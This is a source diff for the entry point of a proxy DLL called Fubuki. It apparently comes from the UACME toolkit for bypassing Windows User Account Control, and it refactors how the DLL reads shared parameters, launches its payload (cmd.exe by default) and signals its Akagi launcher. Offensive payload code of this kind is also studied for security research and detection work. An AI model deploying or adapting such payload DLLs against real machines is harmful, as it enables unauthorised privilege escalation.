@@ -4,9 +4,9 @@
 *
 *  TITLE:       DLLMAIN.C
 *
-*  VERSION:     3.04
+*  VERSION:     3.10
 *
-*  DATE:        10 Nov 2018
+*  DATE:        11 Nov 2018
 *
 *  Proxy dll entry point, Fubuki Kai Ni.
 *
@@ -19,7 +19,7 @@
 
 #include "fubuki.h"
 
-DWORD g_AkagiFlag;
+UACME_PARAM_BLOCK g_SharedParams;
 
 /*
 * DummyFunc
@@ -40,48 +40,52 @@ VOID WINAPI DummyFunc(
 *
 * Purpose:
 *
-* Process parameter if exist or start cmd.exe and exit immediatelly.
+* Process parameter if exist or start cmd.exe and exit immediately.
 *
 */
 VOID DefaultPayload(
     VOID
 )
 {
-    BOOL bIsLocalSystem = FALSE, bReadSuccess;
-    PWSTR lpParameter = NULL;
-    ULONG cbParameter = 0L;
+    BOOL bSharedParamsReadOk;
+    UINT ExitCode;
+    PWSTR lpParameter;
+    ULONG cbParameter;
 
     OutputDebugString(LoadedMsg);
 
-    ucmIsLocalSystem(&bIsLocalSystem);
-    g_AkagiFlag = AKAGI_FLAG_KILO;     
-
-    bReadSuccess = ucmReadParameters(
-        &lpParameter,
-        &cbParameter,
-        &g_AkagiFlag,
-        NULL,
-        bIsLocalSystem);
-
-    ucmLaunchPayload(
-        lpParameter,
-        cbParameter);
-
-    if ((lpParameter == NULL) && (cbParameter == 0)) {
-        if (g_AkagiFlag == AKAGI_FLAG_KILO) {
-            ucmQueryRuntimeInfo(FALSE);
-        }
+    //
+    // Read shared params block.
+    //
+    RtlSecureZeroMemory(&g_SharedParams, sizeof(g_SharedParams));
+    bSharedParamsReadOk = ucmReadSharedParameters(&g_SharedParams);
+    if (bSharedParamsReadOk) {
+        lpParameter = g_SharedParams.szParameter;
+        cbParameter = (ULONG)(_strlen(g_SharedParams.szParameter) * sizeof(WCHAR));
     }
     else {
-        if (bReadSuccess) {
-            RtlFreeHeap(
-                NtCurrentPeb()->ProcessHeap,
-                0,
-                lpParameter);
-        }
+        lpParameter = NULL;
+        cbParameter = 0UL;
     }
 
-    ExitProcess(0);
+    ExitCode = (ucmLaunchPayload(lpParameter, cbParameter) == TRUE);
+
+    //
+    // If this is default executable, show runtime info.
+    //
+    if ((lpParameter == NULL) || (cbParameter == 0)) {
+        if (g_SharedParams.AkagiFlag == AKAGI_FLAG_KILO)
+            ucmQueryRuntimeInfo(FALSE);
+    }
+
+    //
+    // Notify Akagi.
+    //
+    if (bSharedParamsReadOk) {
+        ucmSetCompletion(g_SharedParams.szSignalObject);
+    }
+
+    ExitProcess(ExitCode);
 }
 
 /*
